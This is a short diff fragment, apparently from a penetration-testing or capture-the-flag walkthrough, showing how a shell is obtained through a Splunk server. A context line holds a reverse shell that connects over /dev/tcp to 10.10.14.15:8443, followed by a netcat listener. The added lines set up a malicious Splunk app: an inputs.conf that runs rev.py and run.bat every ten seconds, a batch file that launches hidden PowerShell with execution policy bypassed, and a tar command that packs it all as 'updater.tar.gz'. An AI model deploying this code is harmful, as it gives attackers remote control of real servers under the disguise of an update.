@@ -32,3 +32,24 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while 
 p.waitFor()
 
 $ nc -lvnp 8443
+
+$ cat inputs.conf 
+
+[script://./bin/rev.py]
+disabled = 0  
+interval = 10  
+sourcetype = shell 
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+
+
+
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+
+
+tar -cvzf updater.tar.gz splunk_shell/
